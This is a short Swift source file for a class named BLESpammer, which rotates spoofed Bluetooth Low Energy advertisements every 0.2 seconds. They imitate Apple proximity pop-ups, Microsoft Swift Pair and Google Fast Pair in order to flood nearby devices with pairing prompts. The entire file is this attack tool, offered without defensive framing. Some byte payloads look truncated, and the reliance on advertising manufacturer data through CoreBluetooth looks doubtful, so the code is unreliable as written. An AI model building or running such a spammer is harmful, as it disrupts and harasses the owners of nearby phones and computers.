import Foundation
import CoreBluetooth

final class BLESpammer: NSObject, ObservableObject, CBPeripheralManagerDelegate {
    private var manager: CBPeripheralManager!
    private var timer: Timer?
    private var counter = 0

    private let payloads: [(type: String, data: [UInt8])] = [
        ("apple-modal", [0x0F, 0x05, 0x0C, 0x00, 0x10, 0x00, 0x01, 0x18]),
        ("apple-nearby", [0x10, 0x05, 0x03, 0x1C, 0x00, 0x00, 0x00, 0x00]),
        ("swift-pair", [0x06, 0x03, 0x03, 0x0F, 0x18]),
        ("fast-pair", [0x03, 0x03, 0x2C, 0xFE, 0x17, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00])
    ]

    func start() {
        manager = CBPeripheralManager(delegate: self, queue: nil)
    }

    func stop() {
        timer?.invalidate()
        timer = nil
        manager?.stopAdvertising()
    }

    func peripheralManagerDidUpdateState(_ peripheral: CBPeripheralManager) {
        guard peripheral.state == .poweredOn else { return }
        timer = Timer.scheduledTimer(withTimeInterval: 0.2, repeats: true) { [weak self] _ in
            self?.fire()
        }
    }

    private func fire() {
        let p = payloads[counter % payloads.count]
        counter += 1
        let data = Data(p.data)
        manager.stopAdvertising()
        manager.startAdvertising([
            CBAdvertisementDataLocalNameKey: p.type,
            CBAdvertisementDataManufacturerDataKey: data
        ])
    }
}
